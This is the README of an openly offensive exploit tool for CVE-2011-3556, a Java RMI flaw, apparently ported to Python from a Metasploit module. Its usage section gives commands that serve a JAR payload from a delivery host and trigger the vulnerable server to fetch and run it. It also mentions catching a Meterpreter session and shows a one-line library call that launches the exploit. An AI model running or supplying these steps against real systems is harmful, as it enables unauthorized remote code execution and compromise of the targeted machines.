# CVE-2011-3556 — Proof of Concept (PoC)

## Disclaimer

This tool is a Python 3 implementation of an existing [proof of concept (PoC)](https://www.exploit-db.com/raw/17535) made by mihi for the [Metasploit Framework](https://www.metasploit.com/).

## Prerequisites

To use the module, simply follow the instructions below:

```sh
# Clone this repository locally.
$ git clone https://github.com/sk4la/cve_2011_3556.git && cd cve_2011_3556/

# Optionally set the `x` bit to be able to execute the script directly.
$ chmod u+x exploit.py

$ ./exploit.py --help && echo "It works!"
```

## Usage

### Command-line

To be remotely loaded by the vulnerable Java RMI server, the payload (a JAR binary) must be served as an HTTP resource. One could quickly serve it using the famous `python3 -m http.server`.

Once the payload is made available for download, simply execute the `exploit.py` script to trigger the vulnerability.

```sh
$ python3 -m http.server --bind DELIVERY_HOST DELIVERY_PORT &
$ ./exploit.py -h VULNERABLE_HOST -u http://DELIVERY_HOST:DELIVERY_PORT/PAYLOAD.jar`
```

> In case the payload is a Meterpreter (Metasploit Framework), do not forget to `use exploit/multi/handler`.

### Library

This module can also be used as a library by importing the `cve_2011_3556` module to your current namespace:

```python
from cve_2011_3556 import JavaRMIExploit

JavaRMIExploit("127.0.0.1", "http://127.0.0.1/payload.jar").exploit()
```

It's as simple as that!

## Credits

Special thanks to mihi for the initial implementation of the Metasploit Framework [module](https://www.exploit-db.com/raw/17535).
